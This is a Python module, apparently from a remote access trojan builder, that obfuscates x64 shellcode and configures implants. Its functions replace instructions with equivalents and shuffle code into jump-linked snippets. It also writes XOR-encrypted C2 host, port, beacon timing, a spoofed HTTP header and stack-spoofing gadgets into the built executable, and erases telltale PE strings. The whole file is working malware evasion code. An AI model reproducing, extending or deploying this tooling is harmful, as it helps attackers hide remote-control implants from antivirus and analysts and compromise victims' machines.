import re
import os
import struct
import random
from keystone import Ks, KS_ARCH_X86, KS_MODE_64
from capstone import Cs, CS_ARCH_X86, CS_MODE_64

from Public.Message import Message

class Obfuscator:
    @staticmethod
    def OBFASM(hardCode, _type):
        # 反编译
        asmInfo = []
        cs = Cs(CS_ARCH_X86, CS_MODE_64)
        instructions = cs.disasm(hardCode, 0)
        for instruction in instructions:
            asmInfo += [{'addr': hex(instruction.address), 'mnemonic': instruction.mnemonic, 'ops': instruction.op_str}]

        # 逐条指令等效替换
        obfAsmsList = []
        for i in range(len(asmInfo)):
            if asmInfo[i]['mnemonic'] != 'int3':
                obfAsms = Obfuscator.AsmEquReplace(f'{asmInfo[i]["mnemonic"]} {asmInfo[i]["ops"]}')
                obfAsmsList += [f'label{asmInfo[i]["addr"].replace("0x", "")}:\n{obfAsms}']

        # 乱序处理(分成多个片段后打乱顺序, 通过 jmp 串联)
        snippetList = []
        snippetIndex = 0
        snippet = 'snippet0:\n'
        for i in range(len(obfAsmsList)):
            snippet += f'{obfAsmsList[i]}\n'
            # 当前片段结束
            if random.choice([False, False, False, True]) or i == len(obfAsmsList) - 1:
                snippetIndex += 1
                if i < len(obfAsmsList) - 1:
                    snippet += f'jmp snippet{snippetIndex}'
                snippetList += [snippet]
                snippet = f'snippet{snippetIndex}:\n'
        random.shuffle(snippetList)
        obfAsms = '\n'.join(snippetList)

        ks = Ks(KS_ARCH_X86, KS_MODE_64)
        addHeadCode, _ = ks.asm(f'jmp snippet0\n{obfAsms}')
        if _type == 'separation':
            offset = None
            if addHeadCode[0] == 0xEB:
                offset = addHeadCode[1]
            elif addHeadCode[0] == 0xE9:
                offset = struct.unpack('<I', bytes(addHeadCode[1:5]))[0]
            fakeNum = hex(random.randint(0x00, 0xFF))
            fakeHead = f'push rbx\nsub rsp, {fakeNum}\n'
            fakeTail = f'\nadd rsp, {fakeNum}\npop rbx\nret'
            fakeHeadCode, _ = ks.asm(fakeHead)
            return fakeHead + obfAsms + fakeTail, offset + len(fakeHeadCode)
        else:
            return bytes(addHeadCode)

    @staticmethod
    def OBFSTR(exe, sig, key=None, data=None, origSize=None):
        # 定位 SIG
        index = exe.find(sig)
        if index == -1:
            if sig != b'OBFSIG':
                Message.MessageBox('warning', 'OBFSTR', f'{sig} not found.')
            return False
        # 清除 SIG
        exe[index:index+len(sig)] = b'\x00' * len(sig)
        # 定位原数据
        index += len(sig)
        # 计算原数据大小
        if origSize == None:
            length = 0
            while exe[index+length] != 0x00:
                length += 1
            origSize = length + 1
        # 重写数据
        if data != None:
            if origSize - 1 < len(data):
                Message.MessageBox('warning', 'OBFSTR', f'The length of {data} exceeds {origSize-1}.')
                return False
            exe[index:index+origSize] = b'\x00' * origSize
            exe[index:index+len(data)] = data
        # 加密数据
        Obfuscator.XorData(exe, index, origSize, key)
        return True

    @staticmethod
    def OBFEXE(exe, ratInfo=None):
        key = os.urandom(8)
        while b'\x00' in key:
            key = os.urandom(8)
        if not Obfuscator.OBFSTR(exe, b'OBFKEY', b'\x00', key, 9):
            return False
        if not Obfuscator.OBFSTR(exe, b'This program cannot be run in DOS mode.', origSize=0):
            return False
        if ratInfo:
            if not Obfuscator.OBFSTR(exe, b'fidSIG', key, ratInfo['fid'].encode()):
                return False
            if not Obfuscator.OBFSTR(exe, b'hostSIG', key, ratInfo['listenerInfo']['host'].encode()):
                return False
            if not Obfuscator.OBFSTR(exe, b'portSIG', key, ratInfo['listenerInfo']['port'].encode()):
                return False
            if not Obfuscator.OBFSTR(exe, b'sleepBaseSIG', key, struct.pack('<I', int(ratInfo['sleepBase'])), 5):
                return False
            if not Obfuscator.OBFSTR(exe, b'sleepOffsetMaxSIG', key, struct.pack('<I', int(ratInfo['sleepOffsetMax'])), 5):
                return False
            httpHeader = Obfuscator.GetHttpHeader(ratInfo['httpHeader'])
            if not Obfuscator.OBFSTR(exe, b'httpHeaderSIG', key, httpHeader.encode()):
                return False
            useSpareGadget = 1 if ratInfo['StackSpoofing']['useSpareGadget'] == 'true' else 0
            if not Obfuscator.OBFSTR(exe, b'useSpareGadgetSIG', key, struct.pack('<I', useSpareGadget), 5):
                return False
            if not Obfuscator.OBFSTR(exe, b'gadgetSigSIG', key, ratInfo['StackSpoofing']['gadgetSig']):
                return False
            if not Obfuscator.OBFSTR(exe, b'spareGadgetSigSIG', key, ratInfo['StackSpoofing']['spareGadgetSig']):
                return False
            if not Obfuscator.OBFSTR(exe, b'gadgetSigLenSIG', key, struct.pack('<I', len(ratInfo['StackSpoofing']['gadgetSig'])), 5):
                return False
            if not Obfuscator.OBFSTR(exe, b'spareGadgetSigLenSIG', key, struct.pack('<I', len(ratInfo['StackSpoofing']['spareGadgetSig'])), 5):
                return False
        while Obfuscator.OBFSTR(exe, b'OBFSIG', key):
            pass
        return True

    @staticmethod
    def XorData(data, index, length, key):
        keyIndex = 0
        for i in range(length):
            data[index + i] ^= key[keyIndex]
            keyIndex += 1
            if keyIndex == len(key):
                keyIndex = 0

    @staticmethod
    def GetHttpHeader(httpHeader):
        if 'Path' not in httpHeader:
            httpHeader['Path'] = '/'
        if 'Host' not in httpHeader:
            httpHeader['Host'] = 'www.google.com.hk'
        if 'User-Agent' not in httpHeader:
            httpHeader['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
        httpHeaderText = f'POST {httpHeader["Path"]} HTTP/1.1\r\n' \
                         f'Host: {httpHeader["Host"]}\r\n' \
                         f'User-Agent: {httpHeader["User-Agent"]}\r\n'
        for key, value in httpHeader.items():
            if key not in ['Path', 'Host', 'User-Agent', 'Content-Type', 'Content-Length', 'Connection']:
                httpHeaderText += f'{key}: {value}\r\n'
        httpHeaderText += f'Content-Type: application/octet-stream\r\n' \
                          f'Content-Length: 0\r\n' \
                          f'Connection: close\r\n\r\n'
        return httpHeaderText

    @staticmethod
    def AsmEquReplace(asm):
        mnemonic, ops, opType1, opType2 = GetAsmInfo(asm)

        if 'rip' in asm:
            return asm
        elif asm == 'mov rax, qword ptr gs:[0x60]': # keystone 会将 mov rax, qword ptr gs:[0x60] 的机器码错误的反编译为 movabs rax, qword ptr gs:[0x60], 将错就错
            return 'movabs rax, qword ptr gs:[0x60]'
        elif mnemonic == 'nop':
            return 'nop'
        elif mnemonic == 'call' or mnemonic[0] == 'j':
            if ops[0][0].isdigit():
                return f'{mnemonic} label{ops[0].replace("0x", "")}'
            else:
                return asm

        # 原指令 -> 操作数易变形的指令序列
        obfAsms = ObfMnemonic(mnemonic, ops, opType1, opType2, asm)
        # 混淆操作数
        obfAsms = ObfOps(obfAsms)
        return obfAsms

reg64 = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15', 'rsp', 'rbp', 'rip']
reg32 = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'r8d', 'r9d', 'r10d', 'r11d', 'r12d', 'r13d', 'r14d', 'r15d', 'esp', 'ebp', 'eip']
reg16 = ['ax', 'bx', 'cx', 'dx', 'si', 'di', 'r8w', 'r9w', 'r10w', 'r11w', 'r12w', 'r13w', 'r14w', 'r15w', 'sp', 'bp', 'ip']
regLow8 = ['al', 'bl', 'cl', 'dl', 'sil', 'dil', 'r8b', 'r9b', 'r10b', 'r11b', 'r12b', 'r13b', 'r14b', 'r15b', 'spl', 'bpl', 'ripLow8']

def GetAsmInfo(asm):
    elems = asm.split(' ', 1)
    mnemonic = elems[0]
    ops = []
    if len(elems) > 1:
        ops = elems[1].split(', ')

    opType1 = ''
    if len(ops) > 0 and ops[0]:
        if '[' in ops[0]:
            opType1 = '[]'
        elif ops[0][0].isdigit() or ops[0][0] == '-':
            opType1 = 'i'
        else:
            opType1 = 'r'

    opType2 = ''
    if len(ops) > 1 and ops[1]:
        if '[' in ops[1]:
            opType2 = '[]'
        elif ops[1][0].isdigit() or ops[1][0] == '-':
            opType2 = 'i'
        else:
            opType2 = 'r'
    return mnemonic, ops, opType1, opType2

def SetToFF(r):
    # or r, rand1; or r, (~rand1 | rand2)
    rand1 = random.randint(0x00, 0xFF)
    rand2 = random.randint(0x00, 0xFF)
    return f'or {r}, {hex(rand1)}\nor {r}, {hex(~rand1 | rand2)}'

def SetToZero(r):
    index = random.randint(1, 4)
    if index == 1: # mov r, 0
        return f'mov {r}, 0'
    elif index == 2: # sub r, r
        return f'sub {r}, {r}'
    elif index == 3: # xor r, r
        return f'xor {r}, {r}'
    elif index == 4: # and r, rand1; and r, (~rand1 & rand2)
        rand1 = random.randint(0x00, 0xFF)
        rand2 = random.randint(0x00, 0xFF)
        return f'and {r}, {hex(rand1)}\nand {r}, {hex(~rand1 & rand2)}'

def AddSubLeaImm(op, imm, useLea=False):
    if useLea:
        index = 3
    elif op in reg64 + reg32:
        index = random.randint(1, 3)
    else:
        index = random.randint(1, 2)
    if index == 1: # add ?, i
        return f'add {op}, {hex(imm)}'
    elif index == 2: # sub ?, -i
        return f'sub {op}, {hex(-imm)}'
    elif index == 3: # lea r, [r + i]
        return f'lea {op}, [{op} + {hex(imm)}]'.replace('+ -', '- ')

# 检查 [] 中重复使用的寄存器, 例如 lea eax, [rax + 1] 中的 rax
def CheckRegPlag(indAddrOp, reg):
    index = None
    if reg in reg64:
        index = reg64.index(reg)
    elif reg in reg32:
        index = reg32.index(reg)
    elif reg in reg16:
        index = reg16.index(reg)
    elif reg in regLow8:
        index = regLow8.index(reg)
    if reg32[index] in indAddrOp:
        return reg32[index]
    elif reg64[index] in indAddrOp:
        return reg64[index]
    return None

def ObfIndAddr(obfAsm, useLea=False):
    elems = re.findall(r'(.*\[)([a-zA-Z]\w+)([^\w].*)', obfAsm)
    if elems and '*' not in obfAsm:
        reReg = None # [] 中重复使用的寄存器, 例如 lea eax, [rax + 1] 中的 rax
        indAddrOp = None # [] 类型的操作数, 例如 lea eax, [rcx + 1] 中的 [rcx + 1]
        mnemonic, ops, opType1, opType2 = GetAsmInfo(obfAsm)
        # 检查 [] 中重复使用的寄存器
        if opType1 == 'r':
            indAddrOp = ops[1]
            reReg = CheckRegPlag(indAddrOp, ops[0])
        elif opType2 == 'r':
            indAddrOp = ops[0]
            reReg = CheckRegPlag(indAddrOp, ops[1])
        # eg: lea rax, [rcx + 1] -> add rcx, 2; lea rax, [rcx - 1]; sub rcx, 2
        if not reReg:
            reg = elems[0][1] # [] 中第一个寄存器, 例如 [rcx + 1] 中的 rcx
            rand = random.randint(0x00, 0xFF)
            obfFormula = f'{elems[0][0]}{reg} + {hex(-rand)}{elems[0][2]}'.replace('+ -', '- ')
            return f'{AddSubLeaImm(reg, rand)}\n{obfFormula}\n{AddSubLeaImm(reg, -rand, useLea)}'
        # eg: lea eax, [rax + 1] -> push rcx; mov rcx, rax; add rcx, 2; lea eax, [rcx - 1]; pop rcx
        elif reReg in reg64 and reReg != 'rsp' and indAddrOp.count(reReg) == 1:
            # 随机找出一个当前指令未使用的 x64 寄存器(不包括栈寄存器)
            notUseRegs = reg64[:14]
            regs = re.findall(r'\b[a-zA-Z]\w+\b', indAddrOp)
            for reg in regs:
                if reg in notUseRegs:
                    notUseRegs.remove(reg)
            notUseReg = random.choice(notUseRegs)
            # 生成混淆指令序列
            rand = random.randint(0x00, 0xFF)
            obfFormula = f'{notUseReg} + {hex(-rand)}'.replace('+ -', '- ')
            if indAddrOp == ops[0]:
                obfFormula = f'{mnemonic} {indAddrOp.replace(reReg, obfFormula)}, {ops[1]}'
            elif indAddrOp == ops[1]:
                obfFormula = f'{mnemonic} {ops[0]}, {indAddrOp.replace(reReg, obfFormula)}'
            return f'push {notUseReg}\nmov {notUseReg}, {reReg}\n{AddSubLeaImm(notUseReg, rand)}\n{obfFormula}\npop {notUseReg}'
    return obfAsm

def ObfOps(obfAsms):
    obfAsmList = obfAsms.split('\n')
    obfAsms = ''
    for obfAsm in obfAsmList:
        mnemonic, ops, opType1, opType2 = GetAsmInfo(obfAsm)
        # op2 为 imm
        # eg: mov qword ptr [rax + 1], 1
        #  -> mov qword ptr [rax + 1], 0; add qword ptr [rax + 1], 1
        #  -> add rax, 2; mov qword ptr [rax - 1], 0; sub rax, 2; add rax, 2; add qword ptr [rax - 1], 1; sub rax, 2
        if mnemonic in ['mov', 'add', 'sub'] and opType2 == 'i' and len(ops[1].replace('0x', '').replace('-', '')) < 8:
            imm = int(ops[1], 16)
            rand1 = rand2 = random.randint(0x00, 0xFF)
            if mnemonic == 'sub':
                imm *= -1
                rand2 *= -1
            obf1 = ObfIndAddr(f'{mnemonic} {ops[0]}, {hex(rand1)}')
            obf2 = ObfIndAddr(AddSubLeaImm(ops[0], imm-rand2))
            obfAsms += f'{obf1}\n{obf2}\n'
        # 存在 []
        # eg: lea rax, [rcx + 1] -> add rcx, 2; lea rax, [rcx - 1]; sub rcx, 2
        # eg: lea eax, [rax + 1] -> push rcx; mov rcx, rax; add rcx, 2; lea eax, [rcx - 1]; pop rcx
        elif ('mov' in mnemonic or mnemonic in ['lea', 'add', 'sub', 'and', 'or', 'xor', 'cmp', 'test']) and '[' in obfAsm:
            obfAsms += f'{ObfIndAddr(obfAsm, mnemonic in ["cmp", "test"])}\n'
        else:
            obfAsms += f'{obfAsm}\n'
    return obfAsms.rstrip()

def ObfMnemonic(mnemonic, ops, opType1, opType2, asm):
    # push r
    if mnemonic == 'push' and opType1 == 'r':
        return f'sub rsp, 8\nmov qword ptr [rsp], {ops[0]}'

    # pop r
    if mnemonic == 'pop' and opType1 == 'r':
        return f'mov {ops[0]}, qword ptr [rsp]\nadd rsp, 8'

    # mov r1, r2
    if mnemonic == 'mov' and opType1 == 'r' and opType2 == 'r':
        index = 0
        if ops[0] == ops[1]:
            if ops[1] in reg64 + reg32:
                index = 5
        elif ops[1] in reg64 + reg32:
            index = random.randint(1, 5)
        else:
            index = random.randint(1, 4)
        if index == 1: # r1->0; or r1, r2
            return f'{SetToZero(ops[0])}\nor {ops[0]}, {ops[1]}'
        elif index == 2: # r1->0; xor r1, r2
            return f'{SetToZero(ops[0])}\nxor {ops[0]}, {ops[1]}'
        elif index == 3: # r1->0; add r1, r2
            return f'{SetToZero(ops[0])}\nadd {ops[0]}, {ops[1]}'
        elif index == 4: # r1->FF; and r1, r2
            return f'{SetToFF(ops[0])}\nand {ops[0]}, {ops[1]}'
        elif index == 5: # lea r1, [r2]
            return f'lea {ops[0]}, [{ops[1]}]'

    # add r1, r2 -> lea r1, [r1 + r2]
    if mnemonic == 'add' and ops[0] in reg64 + reg32 and ops[1] in reg64 + reg32:
        return f'lea {ops[0]}, [{ops[0]} + {ops[1]}]'

    # inc ?
    if mnemonic == 'inc':
        return AddSubLeaImm(ops[0], 1)

    # dec ?
    if mnemonic == 'dec':
        return AddSubLeaImm(ops[0], -1)

    # xor r, r
    if mnemonic == 'xor' and ops[0] == ops[1]:
        return SetToZero(ops[0])

    # imul r, r, 0
    if mnemonic == 'imul' and len(ops) == 3 and ops[0] == ops[1] and ops[2] == '0':
        return SetToZero(ops[0])
    return asm